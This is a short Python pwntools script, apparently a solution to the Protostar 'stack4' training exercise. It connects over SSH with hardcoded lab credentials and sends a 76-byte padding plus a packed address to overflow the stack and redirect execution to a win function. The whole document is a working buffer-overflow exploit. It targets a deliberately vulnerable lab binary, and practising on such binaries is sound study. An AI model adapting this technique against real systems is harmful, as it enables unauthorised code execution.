from pwn import *

term = ssh(host='10.100.102.19', user='user', password='user')
bash = term.run('bash')

buffer = 'a'*76
win = p32(0x080483f4)
payload = buffer + win

bash.sendline('/opt/protostar/bin/stack4')
bash.sendline(payload)
print(bash.recv())
bash.interactive()